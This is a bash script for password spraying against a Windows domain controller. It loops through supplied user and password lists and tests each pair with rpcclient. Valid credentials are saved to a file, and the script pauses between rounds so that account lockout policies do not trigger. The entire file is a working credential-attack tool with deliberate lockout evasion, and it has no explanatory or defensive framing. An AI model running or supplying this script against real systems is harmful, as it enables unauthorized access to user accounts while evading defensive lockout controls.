#!/bin/bash

print_help() {
    echo "Usage: $0 -t target -d domain -u users-file.txt -p passwords-list.txt -a attempts -l lockout_minutes"
    echo ""
    echo "-t  target address"
    echo "-d  domain name"
    echo "-u  users file"
    echo "-p  password file"
    echo "-a  attempts before sleep to prevent lockout"
    echo "-l  lockout reset minutes"
    echo "-h  show this help message"
    exit 0
}

# parse options
while getopts ":t:d:u:p:a:l:h" opt; do
    case $opt in
        t) TARGET=$OPTARG ;;
        d) DOMAIN=$OPTARG ;;
        u) USERFILE=$OPTARG ;;
        p) PASSFILE=$OPTARG ;;
        a) MAX_ATTEMPTS=$OPTARG ;;
        l) LOCKOUT_MIN=$OPTARG ;;
        h) print_help ;;
        :)  # missing argument for a flag
            echo "Error: Option -$OPTARG requires a value"
            print_help ;;
        \?) # invalid option
            echo "Error: Invalid option -$OPTARG"
            print_help ;;
    esac
done

# check for required flags
if [ -z "$TARGET" ] || [ -z "$DOMAIN" ] || [ -z "$USERFILE" ] || \
   [ -z "$PASSFILE" ] || [ -z "$MAX_ATTEMPTS" ] || [ -z "$LOCKOUT_MIN" ]; then
    echo "Error: Missing required arguments"
    print_help
fi

BUFFER=30
LOCKOUT_SEC=$((LOCKOUT_MIN * 60 + BUFFER))
ATTEMPT_COUNT=0

echo "Target: $TARGET"
echo "Domain: $DOMAIN"
echo "Users: $USERFILE"
echo "Passwords: $PASSFILE"
echo "Max attempts before sleep: $MAX_ATTEMPTS"
echo "Lockout reset time: $LOCKOUT_MIN minutes"
echo ""

while read password; do

    echo "[*] Spraying password: $password"

    while read user; do

        result=$(rpcclient -U "$DOMAIN/$user%$password" -c "getusername" $TARGET 2>&1)

        if echo "$result" | grep -q "Account Name"; then
            echo "[+] VALID: $user:$password"
            echo "$user:$password" >> valid_creds.txt
        else
            echo "[-] Failed: $user:$password"
        fi

    done < "$USERFILE"

    ATTEMPT_COUNT=$((ATTEMPT_COUNT+1))

    if [ "$ATTEMPT_COUNT" -ge "$MAX_ATTEMPTS" ]; then
        echo ""
        echo "[!] Max attempts reached. Sleeping $LOCKOUT_MIN minutes..."
        sleep $LOCKOUT_SEC
        ATTEMPT_COUNT=0
        echo ""
    fi

done < "$PASSFILE"
